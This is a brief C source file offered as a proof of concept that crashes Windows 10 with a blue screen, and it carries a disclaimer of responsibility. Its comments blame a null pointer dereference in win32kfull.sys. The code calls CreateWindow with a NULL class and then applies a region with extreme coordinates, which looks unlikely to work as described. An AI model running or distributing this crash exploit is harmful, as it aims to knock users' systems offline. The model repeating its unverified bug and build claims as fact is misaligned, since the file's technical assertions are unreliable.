// Copyright (C) 2020 Michal Drozd
// All Rights Reserved

// It is important to note that the use of this program should be in compliance with the laws in your country!
// I cannot be held responsible for any actions taken as a result of using this program!

// Test Windows bug which caused blue screen of death!

#include <stdio.h>
#include <windows.h>

int main()
{
	// This will cause blue screen of death in Windows 10
	// It is a bug in Windows 10, which is not present in Windows 7 and 8.1
	// The bug is fixed in Windows 10 build 14393 and later versions

	// The bug is caused by a null pointer dereference in win32kfull.sys
	// when the system tries to draw a window with an invalid region

	HWND hwnd = CreateWindow(NULL, NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);

	HRGN hrgn = CreateRectRgn(0x80000000, 0x80000000, 0x80000000, 0x80000000);

	SetWindowRgn(hwnd, hrgn, TRUE);

	return 0;
}